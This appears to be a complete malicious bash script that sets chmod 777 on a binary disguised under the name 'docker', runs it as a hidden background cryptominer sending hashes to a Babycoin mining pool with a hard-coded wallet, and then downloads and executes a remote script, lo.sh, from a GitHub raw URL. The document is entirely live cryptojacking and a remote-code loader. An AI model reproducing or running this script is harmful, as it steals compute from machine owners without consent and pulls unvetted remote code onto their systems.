#!/bin/bash
chmod 777 docker
./docker -a rx/arq -o babycoin.multi-pool.net:3333 -u babyz7iH6t3CNhswCAL2judxrvSWemFmjjX1ModDXrL1KebHCf7nNoNRpHKuRUgLiqDHQwy3vWAbvPebbhBBB4mmGQkudgFvnFC -p $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1 > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh
